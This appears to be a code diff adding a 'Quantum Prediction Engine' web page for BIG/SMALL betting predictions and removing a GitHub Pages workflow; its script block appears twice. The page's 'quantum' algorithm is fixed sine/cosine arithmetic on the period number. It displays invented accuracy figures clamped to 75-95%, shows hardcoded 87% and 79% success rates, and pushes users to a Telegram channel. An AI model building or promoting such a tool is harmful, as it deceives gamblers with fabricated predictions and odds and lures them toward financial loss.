+        const totalPredictionsEl = document.getElementById('total-predictions');
+        const winRateEl = document.getElementById('win-rate');
+        const accuracyEl = document.getElementById('accuracy');
+        const tradingView = document.getElementById('trading-view');
+        const particlesContainer = document.getElementById('particles');
+        
+        // Store predictions history
+        let predictionsHistory = JSON.parse(localStorage.getItem('quantumPredictions')) || [];
+        let lastPrediction = null;
+        
+        // Create particles
+        function createParticles() {
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                const size = Math.random() * 5 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Create trading chart
+        function createTradingChart() {
+            tradingView.innerHTML = '<div class="trading-line"></div>';
+            
+            // Create random candles
+            const candleCount = 20;
+            const candleWidth = tradingView.offsetWidth / candleCount;
+            
+            let previousClose = 50;
+            
+            for (let i = 0; i < candleCount; i++) {
+                const open = previousClose;
+                const high = open + Math.random() * 20;
+                const low = open - Math.random() * 20;
+                const close = low + Math.random() * (high - low);
+                
+                const candle = document.createElement('div');
+                candle.classList.add('candle');
+                if (close < open) candle.classList.add('red');
+                
+                const candleHeight = Math.abs(close - open);
+                const candleTop = Math.min(open, close);
+                
+                candle.style.left = `${i * candleWidth + candleWidth / 2}px`;
+                candle.style.height = `${candleHeight}%`;
+                candle.style.bottom = `${candleTop}%`;
+                
+                // Add wick
+                const wick = document.createElement('div');
+                wick.style.position = 'absolute';
+                wick.style.left = '50%';
+                wick.style.transform = 'translateX(-50%)';
+                wick.style.width = '1px';
+                wick.style.height = `${high - low}%`;
+                wick.style.backgroundColor = close >= open ? 'var(--success)' : 'var(--danger)';
+                wick.style.bottom = `${low}%`;
+                
+                candle.appendChild(wick);
+                tradingView.appendChild(candle);
+                
+                previousClose = close;
+            }
+        }
+        
+        // Initialize
+        function init() {
+            createParticles();
+            createTradingChart();
+            updateHistoryTable();
+            calculateStats();
+            
+            // Check if first time user
+            if (!localStorage.getItem('firstTime')) {
+                setTimeout(() => {
+                    alert('[SYSTEM INITIALIZED]\n\nWelcome to QUANTUM PREDICTION ENGINE\n\nEnter period number to execute neural network prediction\n\nJoin our quantum channel for updates: t.me/TradeGenius07');
+                    localStorage.setItem('firstTime', 'false');
+                }, 1000);
+            }
+        }
+        
+        // Advanced quantum prediction algorithm
+        function generatePrediction(period) {
+            // Show loading spinner
+            loader.style.display = 'block';
+            predictBtn.disabled = true;
+            
+            // Simulate quantum computing effect
+            const hackingText = document.querySelector('.terminal-text');
+            let originalText = periodInput.value;
+            let iterations = 0;
+            
+            const hackingInterval = setInterval(() => {
+                let hackedText = '';
+                for (let i = 0; i < originalText.length; i++) {
+                    hackedText += Math.random() > 0.5 ? originalText.charAt(i) : Math.floor(Math.random() * 10);
+                }
+                periodInput.value = hackedText;
+                iterations++;
+                
+                if (iterations > 10) {
+                    clearInterval(hackingInterval);
+                    periodInput.value = originalText;
+                }
+            }, 100);
+            
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const num = parseInt(period);
+                    
+                    // Advanced quantum algorithm
+                    let prediction;
+                    let accuracy;
+                    
+                    // Quantum pattern 1: Wave function analysis
+                    const quantumState = Math.sin(num) * Math.cos(num * 0.317);
+                    
+                    // Quantum pattern 2: Entanglement factor
+                    const entanglement = (num * 0.211) % 1;
+                    
+                    // Quantum pattern 3: Superposition analysis
+                    const superposition = Math.abs(Math.sin(num * 0.1342) + Math.cos(num * 0.2817));
+                    
+                    // Pattern 4: Historical pattern matching
+                    const last10 = predictionsHistory.slice(0, 10);
+                    const lastWins = last10.filter(p => p.outcome === 'ACCURATE').length;
+                    
+                    // Decision matrix
+                    if (quantumState > 0.5) {
+                        prediction = 'BIG';
+                        accuracy = 85 + (entanglement * 10);
+                    } else if (quantumState < -0.5) {
+                        prediction = 'SMALL';
+                        accuracy = 83 + (entanglement * 8);
+                    } else if (lastWins >= 6) {
+                        // If last 6/10 were wins, maintain trend
+                        const lastPred = last10[0]?.prediction;
+                        prediction = lastPred === 'BIG' ? 'BIG' : 'SMALL';
+                        accuracy = 80 + (superposition * 10);
+                    } else {
+                        // Quantum neural network fallback
+                        const nnScore = Math.sin(num * 0.431) + Math.cos(entanglement * 2.5);
+                        prediction = nnScore > 0 ? 'BIG' : 'SMALL';
+                        accuracy = 78 + Math.abs(nnScore * 12);
+                    }
+                    
+                    // Ensure accuracy is between 75-95
+                    accuracy = Math.min(95, Math.max(75, Math.round(accuracy)));
+                    
+                    // Hide loader
+                    loader.style.display = 'none';
+                    predictBtn.disabled = false;
+                    
+                    resolve({
+                        prediction,
+                        accuracy
+                    });
+                }, 2000); // Simulate quantum processing time
+            });
+        }
+        
+        // Show prediction result
+        async function showResult() {
+            const period = periodInput.value.trim();
+            
+            if (!period) {
+                alert('[SYSTEM ALERT]\n\nInput field cannot be empty');
+                return;
+            }
+            
+            resultBig.style.display = 'none';
+            resultSmall.style.display = 'none';
+            
+            const { prediction, accuracy } = await generatePrediction(period);
+            
+            if (prediction === 'BIG') {
+                resultBig.textContent = ` PREDICTION: BIG [${accuracy}% ACCURACY]`;
+                resultBig.style.display = 'block';
+            } else {
+                resultSmall.textContent = ` PREDICTION: SMALL [${accuracy}% ACCURACY]`;
+                resultSmall.style.display = 'block';
+            }
+            
+            // Store last prediction
+            lastPrediction = {
+                period,
+                prediction,
+                accuracy,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Show outcome modal after delay
+            setTimeout(() => {
+                outcomeModal.style.display = 'flex';
+            }, 1000);
+        }
+        
+        // Save prediction outcome
+        function saveOutcome(outcome) {
+            if (!lastPrediction) return;
+            
+            const predictionWithOutcome = {
+                ...lastPrediction,
+                outcome,
+                isCorrect: (outcome === 'ACCURATE') ? true : false
+            };
+            
+            predictionsHistory.unshift(predictionWithOutcome);
+            
+            // Keep only last 50 predictions
+            if (predictionsHistory.length > 50) {
+                predictionsHistory = predictionsHistory.slice(0, 50);
+            }
+            
+            // Save to localStorage
+            localStorage.setItem('quantumPredictions', JSON.stringify(predictionsHistory));
+            
+            // Update UI
+            updateHistoryTable();
+            calculateStats();
+            
+            // Close modal
+            outcomeModal.style.display = 'none';
+            
+            // Show feedback
+            const feedback = outcome === 'ACCURATE' 
+                ? '[PREDICTION ACCURATE]\n\nQuantum algorithm successfully predicted outcome.' 
+                : '[PREDICTION INACCURATE]\n\nNeural network learning from this result.';
+            setTimeout(() => alert(feedback), 300);
+        }
+        
+        // Update history table
+        function updateHistoryTable() {
+            historyTableBody.innerHTML = '';
+            
+            if (predictionsHistory.length === 0) {
+                historyTableBody.innerHTML = `
+                    <tr>
+                        <td colspan="4" style="text-align: center;">No trading data available</td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            predictionsHistory.forEach(prediction => {
+                const row = document.createElement('tr');
+                
+                row.innerHTML = `
+                    <td>${prediction.period}</td>
+                    <td>${prediction.prediction} [${prediction.accuracy}%]</td>
+                    <td class="${prediction.outcome === 'ACCURATE' ? 'win-text' : 'loss-text'}">
+                        ${prediction.outcome}
+                    </td>
+                    <td>${prediction.timestamp || '-'}</td>
+                `;
+                
+                historyTableBody.appendChild(row);
+            });
+        }
+        
+        // Calculate and display stats
+        function calculateStats() {
+            const total = predictionsHistory.length;
+            const wins = predictionsHistory.filter(p => p.outcome === 'ACCURATE').length;
+            const winRate = total > 0 ? Math.round((wins / total) * 100) : 0;
+            
+            // Calculate accuracy based on predictions with accuracy data
+            const accuratePredictions = predictionsHistory.filter(p => p.isCorrect && p.accuracy).length;
+            const totalWithAccuracy = predictionsHistory.filter(p => p.accuracy).length;
+            const accuracy = totalWithAccuracy > 0 ? Math.round((accuratePredictions / totalWithAccuracy) * 100) : 0;
+            
+            totalPredictionsEl.textContent = total;
+            winRateEl.textContent = `${winRate}%`;
+            accuracyEl.textContent = `${accuracy}%`;
+        }
+        
+        // Event Listeners
+        predictBtn.addEventListener('click', showResult);
+        
+        closeModal.addEventListener('click', () => {
+            outcomeModal.style.display = 'none';
+        });
+        
+        winBtn.addEventListener('click', () => {
+            saveOutcome('ACCURATE');
+        });
+        
+        lossBtn.addEventListener('click', () => {
+            saveOutcome('INACCURATE');
+        });
+        
+        viewHistoryBtn.addEventListener('click', () => {
+            historyTab.style.display = 'block';
+            calculateStats();
+        });
+        
+        closeHistory.addEventListener('click', () => {
+            historyTab.style.display = 'none';
+        });
+        
+        // Close modals when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === outcomeModal) {
+                outcomeModal.style.display = 'none';
+            }
+            if (e.target === historyTab) {
+                historyTab.style.display = 'none';
+            }
+        });
+        
+        // Initialize
+        init();
+        
+        // Update chart on resize
+        window.addEventListener('resize', createTradingChart);
+    </script>
 
-on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
 
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
-permissions:
-  contents: read
-  pages: write
-  id-token: write
 
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRADEGENIUS07 - QUANTUM PREDICTION ENGINE</title>
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
 
-jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Setup Pages
-        uses: actions/configure-pages@v5
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v3
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v4
+
+    <div class="cyber-grid"></div>
+    <div class="cyber-glow"></div>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-brain-circuit logo-icon"></i>
+                <h1>QUANTUM PREDICTION ENGINE</h1>
+            </div>
+            <p>Advanced Neural Network bunny Trading System</p>
+            <p class="tagline">>> ALGORITHM ONLINE <<</p>
+        </div>
+        
+        <div class="dashboard">
+            <div class="dashboard-card">
+                <div class="dashboard-title">System Accuracy</div>
+                <div class="dashboard-value">87<span>%</span></div>
+            </div>
+            <div class="dashboard-card">
+                <div class="dashboard-title">Win Rate</div>
+                <div class="dashboard-value">79<span>%</span></div>
+            </div>
+        </div>
+        
+        <div class="trading-view" id="trading-view">
+            <div class="trading-line"></div>
+        </div>
+        
+        <div class="input-section">
+            <div class="input-group">
+                <label for="period"><i class="fas fa-wave-square"></i> ENTER PERIOD NUMBER</label>
+                <div class="input-container">
+                    <i class="fas fa-hashtag"></i>
+                    <input type="number" id="period" placeholder="Input period number..." class="terminal-text">
+                </div>
+            </div>
+            
+            <button class="btn btn-primary" id="predict-btn">
+                <i class="fas fa-bolt"></i> EXECUTE PREDICTION
+            </button>
+            
+            <a href="https://t.me/TradeGenius07" target="_blank" class="btn btn-telegram">
+                <i class="fab fa-telegram"></i> JOIN QUANTUM CHANNEL
+            </a>
+        </div>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="result-container">
+            <div class="result result-big" id="result-big">
+                <i class="fas fa-arrow-up"></i> PREDICTION: BIG [87% ACCURACY]
+            </div>
+            <div class="result result-small" id="result-small">
+                <i class="fas fa-arrow-down"></i> PREDICTION: SMALL [83% ACCURACY]
+            </div>
+        </div>
+        
+        <button class="btn" id="view-history-btn">
+            <i class="fas fa-database"></i> ACCESS TRADING HISTORY
+        </button>
+    </div>
+    
+    <div class="modal" id="outcome-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="close-modal">×</span>
+            <h2 class="modal-title">TRADE OUTCOME</h2>
+            <p>Report your trading result to improve our neural network</p>
+            <p style="color: var(--primary)">Was the prediction accurate?</p>
+            
+            <div class="outcome-btns">
+                <button class="outcome-btn win-btn" id="win-btn">
+                    <i class="fas fa-check"></i> ACCURATE
+                </button>
+                <button class="outcome-btn loss-btn" id="loss-btn">
+                    <i class="fas fa-times"></i> INACCURATE
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="history-tab" id="history-tab">
+        <div class="history-header">
+            <h2 class="history-title"><i class="fas fa-server"></i> TRADING HISTORY DATABASE</h2>
+            <span class="close-history" id="close-history">×</span>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-box">
+                <div class="stat-value" id="total-predictions">0</div>
+                <div class="stat-label">Total Predictions</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="win-rate">0%</div>
+                <div class="stat-label">Win Rate</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="accuracy">0%</div>
+                <div class="stat-label">System Accuracy</div>
+            </div>
+        </div>
+        
+        <table class="history-table">
+            <thead>
+                <tr>
+                    <th>Period</th>
+                    <th>Prediction</th>
+                    <th>Outcome</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="history-table-body">
+                <tr>
+                    <td colspan="4" style="text-align: center;">No trading data available</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <script>
+        // DOM Elements
+        const predictBtn = document.getElementById('predict-btn');
+        const periodInput = document.getElementById('period');
+        const resultBig = document.getElementById('result-big');
+        const resultSmall = document.getElementById('result-small');
+        const outcomeModal = document.getElementById('outcome-modal');
+        const closeModal = document.getElementById('close-modal');
+        const winBtn = document.getElementById('win-btn');
+        const lossBtn = document.getElementById('loss-btn');
+        const viewHistoryBtn = document.getElementById('view-history-btn');
+        const historyTab = document.getElementById('history-tab');
+        const closeHistory = document.getElementById('close-history');
+        const historyTableBody = document.getElementById('history-table-body');
+        const loader = document.getElementById('loader');
+        const totalPredictionsEl = document.getElementById('total-predictions');
+        const winRateEl = document.getElementById('win-rate');
+        const accuracyEl = document.getElementById('accuracy');
+        const tradingView = document.getElementById('trading-view');
+        const particlesContainer = document.getElementById('particles');
+        
+        // Store predictions history
+        let predictionsHistory = JSON.parse(localStorage.getItem('quantumPredictions')) || [];
+        let lastPrediction = null;
+        
+        // Create particles
+        function createParticles() {
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                const size = Math.random() * 5 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Create trading chart
+        function createTradingChart() {
+            tradingView.innerHTML = '<div class="trading-line"></div>';
+            
+            // Create random candles
+            const candleCount = 20;
+            const candleWidth = tradingView.offsetWidth / candleCount;
+            
+            let previousClose = 50;
+            
+            for (let i = 0; i < candleCount; i++) {
+                const open = previousClose;
+                const high = open + Math.random() * 20;
+                const low = open - Math.random() * 20;
+                const close = low + Math.random() * (high - low);
+                
+                const candle = document.createElement('div');
+                candle.classList.add('candle');
+                if (close < open) candle.classList.add('red');
+                
+                const candleHeight = Math.abs(close - open);
+                const candleTop = Math.min(open, close);
+                
+                candle.style.left = `${i * candleWidth + candleWidth / 2}px`;
+                candle.style.height = `${candleHeight}%`;
+                candle.style.bottom = `${candleTop}%`;
+                
+                // Add wick
+                const wick = document.createElement('div');
+                wick.style.position = 'absolute';
+                wick.style.left = '50%';
+                wick.style.transform = 'translateX(-50%)';
+                wick.style.width = '1px';
+                wick.style.height = `${high - low}%`;
+                wick.style.backgroundColor = close >= open ? 'var(--success)' : 'var(--danger)';
+                wick.style.bottom = `${low}%`;
+                
+                candle.appendChild(wick);
+                tradingView.appendChild(candle);
+                
+                previousClose = close;
+            }
+        }
+        
+        // Initialize
+        function init() {
+            createParticles();
+            createTradingChart();
+            updateHistoryTable();
+            calculateStats();
+            
+            // Check if first time user
+            if (!localStorage.getItem('firstTime')) {
+                setTimeout(() => {
+                    alert('[SYSTEM INITIALIZED]\n\nWelcome to QUANTUM PREDICTION ENGINE\n\nEnter period number to execute neural network prediction\n\nJoin our quantum channel for updates: t.me/TradeGenius07');
+                    localStorage.setItem('firstTime', 'false');
+                }, 1000);
+            }
+        }
+        
+        // Advanced quantum prediction algorithm
+        function generatePrediction(period) {
+            // Show loading spinner
+            loader.style.display = 'block';
+            predictBtn.disabled = true;
+            
+            // Simulate quantum computing effect
+            const hackingText = document.querySelector('.terminal-text');
+            let originalText = periodInput.value;
+            let iterations = 0;
+            
+            const hackingInterval = setInterval(() => {
+                let hackedText = '';
+                for (let i = 0; i < originalText.length; i++) {
+                    hackedText += Math.random() > 0.5 ? originalText.charAt(i) : Math.floor(Math.random() * 10);
+                }
+                periodInput.value = hackedText;
+                iterations++;
+                
+                if (iterations > 10) {
+                    clearInterval(hackingInterval);
+                    periodInput.value = originalText;
+                }
+            }, 100);
+            
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const num = parseInt(period);
+                    
+                    // Advanced quantum algorithm
+                    let prediction;
+                    let accuracy;
+                    
+                    // Quantum pattern 1: Wave function analysis
+                    const quantumState = Math.sin(num) * Math.cos(num * 0.317);
+                    
+                    // Quantum pattern 2: Entanglement factor
+                    const entanglement = (num * 0.211) % 1;
+                    
+                    // Quantum pattern 3: Superposition analysis
+                    const superposition = Math.abs(Math.sin(num * 0.1342) + Math.cos(num * 0.2817));
+                    
+                    // Pattern 4: Historical pattern matching
+                    const last10 = predictionsHistory.slice(0, 10);
+                    const lastWins = last10.filter(p => p.outcome === 'ACCURATE').length;
+                    
+                    // Decision matrix
+                    if (quantumState > 0.5) {
+                        prediction = 'BIG';
+                        accuracy = 85 + (entanglement * 10);
+                    } else if (quantumState < -0.5) {
+                        prediction = 'SMALL';
+                        accuracy = 83 + (entanglement * 8);
+                    } else if (lastWins >= 6) {
+                        // If last 6/10 were wins, maintain trend
+                        const lastPred = last10[0]?.prediction;
+                        prediction = lastPred === 'BIG' ? 'BIG' : 'SMALL';
+                        accuracy = 80 + (superposition * 10);
+                    } else {
+                        // Quantum neural network fallback
+                        const nnScore = Math.sin(num * 0.431) + Math.cos(entanglement * 2.5);
+                        prediction = nnScore > 0 ? 'BIG' : 'SMALL';
+                        accuracy = 78 + Math.abs(nnScore * 12);
+                    }
+                    
+                    // Ensure accuracy is between 75-95
+                    accuracy = Math.min(95, Math.max(75, Math.round(accuracy)));
+                    
+                    // Hide loader
+                    loader.style.display = 'none';
+                    predictBtn.disabled = false;
+                    
+                    resolve({
+                        prediction,
+                        accuracy
+                    });
+                }, 2000); // Simulate quantum processing time
+            });
+        }
+        
+        // Show prediction result
+        async function showResult() {
+            const period = periodInput.value.trim();
+            
+            if (!period) {
+                alert('[SYSTEM ALERT]\n\nInput field cannot be empty');
+                return;
+            }
+            
+            resultBig.style.display = 'none';
+            resultSmall.style.display = 'none';
+            
+            const { prediction, accuracy } = await generatePrediction(period);
+            
+            if (prediction === 'BIG') {
+                resultBig.textContent = ` PREDICTION: BIG [${accuracy}% ACCURACY]`;
+                resultBig.style.display = 'block';
+            } else {
+                resultSmall.textContent = ` PREDICTION: SMALL [${accuracy}% ACCURACY]`;
+                resultSmall.style.display = 'block';
+            }
+            
+            // Store last prediction
+            lastPrediction = {
+                period,
+                prediction,
+                accuracy,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Show outcome modal after delay
+            setTimeout(() => {
+                outcomeModal.style.display = 'flex';
+            }, 1000);
+        }
+        
+        // Save prediction outcome
+        function saveOutcome(outcome) {
+            if (!lastPrediction) return;
+            
+            const predictionWithOutcome = {
+                ...lastPrediction,
+                outcome,
+                isCorrect: (outcome === 'ACCURATE') ? true : false
+            };
+            
+            predictionsHistory.unshift(predictionWithOutcome);
+            
+            // Keep only last 50 predictions
+            if (predictionsHistory.length > 50) {
+                predictionsHistory = predictionsHistory.slice(0, 50);
+            }
+            
+            // Save to localStorage
+            localStorage.setItem('quantumPredictions', JSON.stringify(predictionsHistory));
+            
+            // Update UI
+            updateHistoryTable();
+            calculateStats();
+            
+            // Close modal
+            outcomeModal.style.display = 'none';
+            
+            // Show feedback
+            const feedback = outcome === 'ACCURATE' 
+                ? '[PREDICTION ACCURATE]\n\nQuantum algorithm successfully predicted outcome.' 
+                : '[PREDICTION INACCURATE]\n\nNeural network learning from this result.';
+            setTimeout(() => alert(feedback), 300);
+        }
+        
+        // Update history table
+        function updateHistoryTable() {
+            historyTableBody.innerHTML = '';
+            
+            if (predictionsHistory.length === 0) {
+                historyTableBody.innerHTML = `
+                    <tr>
+                        <td colspan="4" style="text-align: center;">No trading data available</td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            predictionsHistory.forEach(prediction => {
+                const row = document.createElement('tr');
+                
+                row.innerHTML = `
+                    <td>${prediction.period}</td>
+                    <td>${prediction.prediction} [${prediction.accuracy}%]</td>
+                    <td class="${prediction.outcome === 'ACCURATE' ? 'win-text' : 'loss-text'}">
+                        ${prediction.outcome}
+                    </td>
+                    <td>${prediction.timestamp || '-'}</td>
+                `;
+                
+                historyTableBody.appendChild(row);
+            });
+        }
+        
+        // Calculate and display stats
+        function calculateStats() {
+            const total = predictionsHistory.length;
+            const wins = predictionsHistory.filter(p => p.outcome === 'ACCURATE').length;
+            const winRate = total > 0 ? Math.round((wins / total) * 100) : 0;
+            
+            // Calculate accuracy based on predictions with accuracy data
+            const accuratePredictions = predictionsHistory.filter(p => p.isCorrect && p.accuracy).length;
+            const totalWithAccuracy = predictionsHistory.filter(p => p.accuracy).length;
+            const accuracy = totalWithAccuracy > 0 ? Math.round((accuratePredictions / totalWithAccuracy) * 100) : 0;
+            
+            totalPredictionsEl.textContent = total;
+            winRateEl.textContent = `${winRate}%`;
+            accuracyEl.textContent = `${accuracy}%`;
+        }
+        
+        // Event Listeners
+        predictBtn.addEventListener('click', showResult);
+        
+        closeModal.addEventListener('click', () => {
+            outcomeModal.style.display = 'none';
+        });
+        
+        winBtn.addEventListener('click', () => {
+            saveOutcome('ACCURATE');
+        });
+        
+        lossBtn.addEventListener('click', () => {
+            saveOutcome('INACCURATE');
+        });
+        
+        viewHistoryBtn.addEventListener('click', () => {
+            historyTab.style.display = 'block';
+            calculateStats();
+        });
+        
+        closeHistory.addEventListener('click', () => {
+            historyTab.style.display = 'none';
+        });
+        
+        // Close modals when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === outcomeModal) {
+                outcomeModal.style.display = 'none';
+            }
+            if (e.target === historyTab) {
+                historyTab.style.display = 'none';
+            }
+        });
+        
+        // Initialize
+        init();
+        
+        // Update chart on resize
+        window.addEventListener('resize', createTradingChart);
+    </script>
+
+
+</body></html>
